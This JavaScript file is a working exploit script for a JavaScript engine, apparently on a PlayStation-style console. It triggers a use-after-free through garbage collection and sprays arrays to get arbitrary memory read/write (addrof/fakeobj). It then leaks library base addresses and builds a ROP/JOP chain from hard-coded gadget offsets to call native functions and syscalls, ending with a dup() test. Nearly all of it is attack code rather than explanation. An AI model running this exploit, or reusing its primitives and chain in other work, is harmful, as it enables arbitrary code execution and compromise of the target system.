class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    this.buf = new ArrayBuffer(8)
    this.i8 = new Int8Array(this.buf)
    this.u8 = new Uint8Array(this.buf)
    this.i16 = new Int16Array(this.buf)
    this.u16 = new Uint16Array(this.buf)
    this.i32 = new Int32Array(this.buf)
    this.u32 = new Uint32Array(this.buf)
    this.f32 = new Float32Array(this.buf)
    this.f64 = new Float64Array(this.buf)

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var val = arguments[0]
        switch (typeof val) {
          case 'boolean':
            this.u8[0] = (val === true) | 0
            break
          case 'number':
            if (Number.isNaN(val)) {
              throw new TypeError(`value ${val} is NaN`)
            }

            this.f64[0] = val

            break
          case 'string':
            if (val.startsWith('0x')) {
              val = val.slice(2)
            }

            if (val.length > this.u8.length * 2) {
              throw new RangeError(`value ${val} is out of range !!`)
            }

            while (val.length < this.u8.length * 2) {
              val = '0' + val
            }

            for (var i = 0; i < this.u8.length; i++) {
              var start = val.length - 2 * (i + 1)
              var end = val.length - 2 * i
              var b = val.slice(start, end)
              this.u8[i] = parseInt(b, 16)
            }

            break
          case 'object':
            if (val instanceof BigInt) {
              this.u8.set(val.u8)
              break
            } else {
              var prop = BigInt.TYPE_MAP[val.constructor.name]
              if (prop in this) {
                var arr = this[prop]
                if (val.length !== arr.length) {
                  throw new Error(
                    `Array length mismatch, expected ${arr.length} got ${val.length}.`
                  )
                }

                arr.set(val)
                break
              }
            }
          default:
            throw new TypeError(`Unsupported value ${val} !!`)
        }
        break
      case 2:
        var hi = arguments[0]
        var lo = arguments[1]

        if (!Number.isInteger(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }

        this.u32[0] = lo
        this.u32[1] = hi
        break
      default:
        throw new TypeError('Unsupported input !!')
    }
  }

  toString () {
    var val = '0x'
    for (var i = this.u8.length - 1; i >= 0; i--) {
      var c = this.u8[i].toString(16).toUpperCase()
      val += c.length === 1 ? '0' + c : c
    }
    return val
  }

  endian () {
    for (var i = 0; i < this.u8.length / 2; i++) {
      var b = this.u8[i]
      this.u8[i] = this.u8[this.u8.length - 1 - i]
      this.u8[this.u8.length - 1 - i] = b
    }
  }

  lo () {
    return this.u32[0]
  }

  hi () {
    return this.u32[1]
  }

  d () {
    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    return this.f64[0]
  }

  jsv () {
    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0))
  }

  cmp (val) {
    if (this.hi() > val.hi()) {
      return 1
    }

    if (this.hi() < val.hi()) {
      return -1
    }

    if (this.lo() > val.lo()) {
      return 1
    }

    if (this.lo() < val.lo()) {
      return -1
    }

    return 0
  }

  eq (val) {
    return this.hi() === val.hi() && this.lo() === val.lo() 
  }

  neq (val) {
    return this.hi() !== val.hi() || this.lo() !== val.lo()
  }

  gt (val) {
    return this.cmp(val) > 0
  }

  gte (val) {
    return this.cmp(val) >= 0
  }

  lt (val) {
    return this.cmp(val) < 0
  }

  lte (val) {
    return this.cmp(val) <= 0
  }

  add (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] + val.u8[i] + c
      c = (b > 0xFF) | 0
      ret.u8[i] = b
    }

    return ret
  }

  sub (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] - val.u8[i] - c
      c = (b < 0) | 0
      ret.u8[i] = b
    }

    return ret
  }

  mul (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var s = c
      for (var j = 0; j <= i; j++) {
        s += this.u8[j] * (val.u8[i - j] || 0)
      }

      ret.u8[i] = s & 0xFF
      c = s >>> 8
    }

    if (c !== 0) {
      throw new Error("mul overflowed !!")
    }

    return ret
  }

  divmod (val) {
    if (!val.gte(BigInt.Zero)) {
      throw new Error("Division by zero")
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
      r = r.shl(1)

      var byte_idx = Math.floor(b / 8)
      var bit_idx = b % 8

      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1

      if (r.gte(val)) {
        r = r.sub(val)

        q.u8[byte_idx] |= 1 << bit_idx
      }
    }

    return { q: q, r: r }
  }

  div (val) {
    return this.divmod(val).q
  }

  mod (val) {
    return this.divmod(val).r
  }

  xor (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] ^ val.u8[i]
    }

    return ret
  }

  and (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] & val.u8[i]
    }

    return ret
  }

  or (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] | val.u8[i]
    }

    return ret
  }

  neg () {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = ~this.u8[i]
    }

    return ret.and(BigInt.One)
  }

  shl (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
      var t = i - byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
      }

      ret.u8[i] = b
    }

    return ret
  }

  shr (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = 0; i < this.buf.byteLength; i++) {
      var t = i + byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
      }

      ret.u8[i] = b
    }

    return ret
  }
}

BigInt.Zero = new BigInt()
BigInt.One = new BigInt(0, 1)
BigInt.TYPE_MAP = {
  Int8Array: 'i8',
  Uint8Array: 'u8',
  Int16Array: 'i16',
  Uint16Array: 'u16',
  Int32Array: 'i32',
  Uint32Array: 'u32',
  Float32Array: 'f32',
  Float64Array: 'f64',
}

var allocs = new Map();

function make_uaf(arr) {
    var o = {}
    for (var i in {xx: ""}) {
        for (i of [arr]) {}
        o[i]
    }

    gc()
}

// needed for rw primitives
var prim_uaf_idx = -1
var prim_spray_idx = -1
var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array

// store Uint32Array structure ids to be used for fake master id later 
var structs = new Array(0x100)

// used for rw primitives
var master, slave

// rw primitive leak addresses 
var leak_obj, leak_obj_addr, master_addr

// spray Uint32Array structure ids
for (var i = 0; i < structs.length; i++) {
  structs[i] = new Uint32Array(1)
  structs[i][`spray_${i}`] = 0x1337
}

log("Initiate UAF...")

var uaf_arr = new Uint32Array(0x80000)

// fake m_hashAndFlags
uaf_arr[4] = 0xB0 

make_uaf(uaf_arr)

log("Achieved UAF !!")

log("Spraying arrays with marker...")
// spray candidates arrays to be used as leak primitive
var spray = new Array(0x1000)
for (var i = 0; i < spray.length; i++) {
    spray[i] = [prim_marker.jsv().d(), {}]
}

log("Looking for marked array...")
// find sprayed candidate by marker then corrupt its length 
for (var i = 0; i < uaf_arr.length; i += 2) {
  var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
  if (val.eq(prim_marker)) {
    log(`Found marker at uaf_arr[${i}] !!`)

    prim_uaf_idx = i - 2

    log (`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)

    log("Corrupting marked array length...")
    // corrupt indexing header
    uaf_arr[prim_uaf_idx] = 0x1337
    uaf_arr[prim_uaf_idx + 1] = 0x1337
    break
  }
}

if (prim_uaf_idx === -1) {
  throw new Error("Failed to find marked array !!")
}

// find index of corrupted array
for (var i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    log(`Found corrupted array at spray[${i}] !!`)
    log(`Corrupted array length ${new BigInt(0, spray[i].length)}`)

    prim_spray_idx = i
    break
  }
}

if (prim_spray_idx === -1) {
    throw new Error("Failed to find corrupted array !!")
}

log("Initiate RW primitives...")

var prim_uaf_obj_idx = prim_uaf_idx + 4

slave = new Uint32Array(0x1000)
slave[0] = 0x13371337

// leak address of leak_obj
leak_obj = {obj: slave}

spray[prim_spray_idx][1] = leak_obj

leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
var structure_id = 0x80
while (!(master instanceof Uint32Array)) {
  var rw_obj = { 
    js_cell: new BigInt(0x1182300, structure_id++).jsv().d(), 
    butterfly: 0, 
    vector: slave, 
    length_and_flags: 0x1337 
  }

  spray[prim_spray_idx][1] = rw_obj

  var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

  rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))

  uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
  uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()

  master = spray[prim_spray_idx][1]
}

master_addr = new BigInt(master[5], master[4])

log(`master_addr: ${master_addr}`)
log("Achieved RW primitives !!")

var mem = {
  read8: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(slave[1], slave[0])
    return retval
  },
  read4: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(0, slave[0])
    return retval
  },
  write8: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    if (val instanceof BigInt) {
      slave[0] = val.lo()
      slave[1] = val.hi()
    } else {
      slave[0] = val
      slave[1] = 0
    }
  },
  write4: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    slave[0] = val
  },
  addrof: function (obj) {
    leak_obj.obj = obj
    return mem.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
  },
  fakeobj: function(addr) {
    mem.write8(leak_obj_addr.add(new BigInt(0, 0x10)), addr);
    return leak_obj.obj;
  },
  malloc: function(count) {
    var buf = new Uint8Array(count);
    var backing = mem.backing(buf);
    allocs.set(backing, buf);
    return backing;
  },
  free: function(addr) {
    if (allocs.has(addr)) {
      allocs.delete(addr);
    }
  },
  free_all() {
    allocs.clear();
  },
  cstr: function(str) {
    var bytes = new Uint8Array(str.length + 1);

    for (var i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF;
    }

    bytes[str.length] = 0;

    var backing = mem.backing(bytes);
    allocs.set(backing, bytes);
    return backing;
  },
  backing(buf) {
    return mem.read8(mem.addrof(buf).add(new BigInt(0, 0x10)));
  }
}

var math_min_addr = mem.addrof(Math.min)
log(`addrof(Math.min): ${math_min_addr}`)

var class_info = mem.read8(math_min_addr.add(new BigInt(0, 0x10)))
log(`class_info: ${class_info}`)

var native_executable = mem.read8(math_min_addr.add(new BigInt(0, 0x18)))
log(`native_executable: ${native_executable}`)

var native_executable_function = mem.read8(native_executable.add(new BigInt(0, 0x40)))
log(`native_executable_function: ${native_executable_function}`)

var native_executable_constructor = mem.read8(native_executable.add(new BigInt(0, 0x48)))
log(`native_executable_constructor: ${native_executable_constructor}`)

var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))

var _error_addr = mem.read8(base_addr.add(new BigInt(0, 0x1E72398)))
log(`_error_addr: ${_error_addr}`)

var strerror_addr = mem.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
log(`strerror_addr: ${strerror_addr}`)

var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))

var _read_addr = mem.read8(libc_addr.add(new BigInt(0, 0xDBD30)))
log(`_read_addr: ${_read_addr}`)

var syscall_fn_addr = _read_addr.add(new BigInt(0, 7))
log(`syscall_fn_addr: ${syscall_fn_addr}`)

var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)

var native_invoke_addr = mem.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)))
log(`native_invoke_addr: ${native_invoke_addr}`)

var eboot_addr = native_invoke_addr.sub(new BigInt(0, 0x39330))

var curl_easy_init_addr = mem.read8(eboot_addr.add(new BigInt(0, 0x3C7D18)))

var libcurl_addr = curl_easy_init_addr.sub(new BigInt(0, 0x78C0))

log(`base_addr: ${base_addr}`)
log(`libc_addr: ${libc_addr}`)
log(`libcurl_addr: ${libcurl_addr}`)
log(`eboot_addr: ${eboot_addr}`)

var gadgets = {
  RET:  base_addr.add(new BigInt(0, 0x4C)),
  POP_R10_RET:  base_addr.add(new BigInt(0, 0x19E297C)),
  POP_R12_RET:  base_addr.add(new BigInt(0, 0x3F3231)),
  POP_R14_RET:  base_addr.add(new BigInt(0, 0x15BE0A)),
  POP_R15_RET:  base_addr.add(new BigInt(0, 0x93CD7)),
  POP_R8_RET:   base_addr.add(new BigInt(0, 0x19BFF1)),
  POP_R9_JO_RET:  base_addr.add(new BigInt(0, 0x72277C)),
  POP_RAX_RET:  base_addr.add(new BigInt(0, 0x54094)),
  POP_RBP_RET:  base_addr.add(new BigInt(0, 0xC7)),
  POP_RBX_RET:  base_addr.add(new BigInt(0, 0x9D314)),
  POP_RCX_RET:  base_addr.add(new BigInt(0, 0x2C3DF3)),
  POP_RDI_RET:  base_addr.add(new BigInt(0, 0x93CD8)),
  POP_RDX_RET:  base_addr.add(new BigInt(0, 0x3A3DA2)),
  POP_RSI_RET:  base_addr.add(new BigInt(0, 0xCFEFE)),
  POP_RSP_RET:  base_addr.add(new BigInt(0, 0xC89EE)),
  LEAVE_RET:  base_addr.add(new BigInt(0, 0x50C33)),
  MOV_RAX_QWORD_PTR_RDI_RET:  base_addr.add(new BigInt(0, 0x36073)),
  MOV_QWORD_PTR_RDI_RAX_RET:  base_addr.add(new BigInt(0, 0x27FD0)),
  MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: base_addr.add(new BigInt(0, 0x46E8F0)),
  PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: base_addr.add(new BigInt(0, 0x3F6F70)),
  MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10:  base_addr.add(new BigInt(0, 0x18B3B5)),
  PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22:  base_addr.add(new BigInt(0, 0x1E25AA1)),
  PUSH_RBP_POP_RCX_RET: base_addr.add(new BigInt(0, 0x1737EEE)),
  MOV_RAX_RCX_RET: base_addr.add(new BigInt(0, 0x41015)),
  PUSH_RAX_POP_RBP_RET: base_addr.add(new BigInt(0, 0x4E82B9))
}

var rop = {
  idx: 0,
  stack_addr: mem.malloc(0x5000),
  ret_buf_addr: mem.malloc(8),
  clear: function() {
    rop.idx = 0;
    
    for (var i = 0; i < 0xA00; i++) {
      mem.write8(rop.stack_addr.add(new BigInt(0, i * 8)), BigInt.Zero)
    } 
  },
  push: function(val) {
    if (rop.idx > 0x5000) {
      throw new Error("Stack full !!")
    }

    mem.write8(rop.stack_addr.add(new BigInt(0, rop.idx)), val)
    rop.idx += 8
  },
  execute: function(insts, store_addr, store_size) {
    if (store_size % 8 !== 0) {
      throw new Error("Invalid store, not aligned by 8 bytes");
    }

    if (store_size < 8) {
      throw new Error("Invalid store, minimal size is 8 to store RSP");
    }

    var header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET) 
    rop.store(header, store_addr, 0)

    var footer = []

    rop.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(new BigInt(0, 0xa)) // JSValue for undefined
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (var i = 0; i < insts.length; i++) {
      rop.push(insts[i])
    }

    var jop_stack_store = mem.malloc(8)
    var jop_stack_addr = mem.malloc(0x6A)

    var jop_stack_base_addr = jop_stack_addr.add(new BigInt(0, 0x22))

    mem.write8(jop_stack_addr, gadgets.POP_RSP_RET)
    mem.write8(jop_stack_base_addr, rop.stack_addr)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x10)), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x18)), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x40)), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)

    mem.write8(jop_stack_store, jop_stack_base_addr)

    var fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)

    fake(0, 0, 0, mem.fakeobj(jop_stack_store))

    mem.free(fake.executable)
    mem.free(jop_stack_store)
    mem.free(jop_stack_addr)
    
    rop.clear()
  },
  fake_builtin: function(addr) {
    function fake() {}

    var fake_native_executable = mem.malloc(0x60)
    for (var i = 0; i < 0x60; i += 8) {
      var val = mem.read8(native_executable.add(new BigInt(0, i)))
      mem.write8(fake_native_executable.add(new BigInt(0, i)), val)
    }

    mem.write8(fake_native_executable.add(new BigInt(0, 0x40)), addr)

    var fake_addr = mem.addrof(fake)

    mem.write8(fake_addr.add(new BigInt(0, 0x10)), class_info)
    mem.write8(fake_addr.add(new BigInt(0, 0x18)), fake_native_executable)

    fake.executable = fake_native_executable

    return fake
  },
  store(insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET);
    insts.push(addr.add(new BigInt(0, index * 8)));
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  },
  load(insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET);
    insts.push(addr.add(new BigInt(0, index * 8)));
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }
}

var fn = {
  register: function(input, name, ret) {
    if (name in this) {
      throw new Error(`${name} already registered in fn !!`);
    }

    var id;
    var addr
    var syscall = false
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === "number") {
      id = new BigInt(0, input)
      addr = syscall_fn_addr
      syscall = true;
    } 

    var f = function() {
      if (arguments.length > 6) {
        throw new Error("More than 6 arguments is not supported !!");
      }

      var ctx = []
      var insts = []

      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

      insts.push(gadgets.POP_RAX_RET)
      insts.push(syscall ? id : BigInt.Zero)

      for (var i = 0; i < arguments.length; i++) {
        var reg = regs[i]
        var value = arguments[i]

        insts.push(reg)

        switch (typeof value) {
          case 'boolean':
            value = new BigInt(value)
            break
          case 'string':
            value = mem.cstr(value)
            ctx.push(value)
            break
          default:
            if (!(value instanceof BigInt)) {
              throw new Error(`Invalid value at arg ${i}`)
            }
            break
        }

        insts.push(value)
      }

      insts.push(addr)

      var store_size = ret ? 0x10 : 8;
      var store_addr = mem.malloc(store_size);

      if (ret) {
        rop.store(insts, store_addr, 1);
      }

      rop.execute(insts, store_addr, store_size)

      while (ctx.length > 0) {
        mem.free(ctx.pop())
      }

      var out = mem.read8(store_addr.add(new BigInt(0, 8)))

      mem.free(store_addr)

      return out
    }

    Object.defineProperty(f, "addr", { value: addr })

    fn[name] = f
  },
  unregister(name) {
    if (!(name in this)) {
      log(`${name} not registered in fn !!`);
      return false;
    }

    delete fn[name];

    return true;
  }
}

var funcs = [
  {input: libc_addr.add(new BigInt(0, 0x6CA00)), name: "setjmp", ret: true},
  {input: libc_addr.add(new BigInt(0, 0x6CA50)), name: "longjmp", ret: false},
  {input: libc_addr.add(new BigInt(0, 0x5F0)), name: "sceKernelGetModuleInfoForUnwind", ret: true},
  {input: 0x14, name: "getpid", ret: true},
  {input: 0x29, name: "dup", ret: true},
]

for (var i = 0; i < funcs.length; i++) {
  var func = funcs[i];
  fn.register(func.input, func.name, func.ret)
}


log("=== TESTING DUP ===")

// Try to duplicate stdout (fd 1)
var new_fd = fn.dup(new BigInt(0, 1))

log("Original FD: 1 (stdout)")
log("Duplicated FD: " + new_fd)
log("Duplicated FD (hex): " + new_fd.toString())

alert("Duplicated FD: " + new_fd)
